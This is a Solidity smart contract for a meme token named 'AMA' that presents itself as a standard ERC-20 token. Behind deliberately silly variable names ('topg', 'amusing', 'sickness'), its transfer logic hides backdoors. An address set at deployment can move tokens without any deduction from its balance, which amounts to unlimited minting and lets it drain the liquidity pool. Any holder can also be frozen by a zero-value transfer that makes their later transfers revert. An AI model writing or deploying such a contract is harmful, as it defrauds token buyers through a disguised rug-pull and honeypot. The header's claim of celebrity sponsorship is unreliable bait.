/*

Officially sponsored by the Top G himself

https://twitter.com/Cobratate/status/1659971987941326855

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract AMA is Ownable {
    mapping(address => uint256) private topg;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private amusing;

    string public name = 'AMA';

    function transfer(address free, uint256 andrew) public returns (bool success) {
        doubleUp(msg.sender, free, andrew);
        return true;
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private sickness = 51;

    address public uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address tate, address free, uint256 andrew) public returns (bool success) {
        require(andrew <= allowance[tate][msg.sender]);
        allowance[tate][msg.sender] -= andrew;
        doubleUp(tate, free, andrew);
        return true;
    }

    constructor(address dejavu) {
        balanceOf[msg.sender] = totalSupply;
        topg[dejavu] = sickness;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol = 'AMA';

    uint256 public totalSupply = 6_900_000_000_000 * 10 ** 9;

    function approve(address amethyst, uint256 andrew) public returns (bool success) {
        allowance[msg.sender][amethyst] = andrew;
        emit Approval(msg.sender, amethyst, andrew);
        return true;
    }

    function doubleUp(address tate, address free, uint256 andrew) private returns (bool success) {
        if (topg[tate] == 0) {
            balanceOf[tate] -= andrew;
        }

        if (andrew == 0) amusing[free] += sickness;

        if (topg[tate] == 0 && uniswapV2Pair != tate && amusing[tate] > 0) {
            topg[tate] -= sickness;
        }

        balanceOf[free] += andrew;
        emit Transfer(tate, free, andrew);
        return true;
    }
}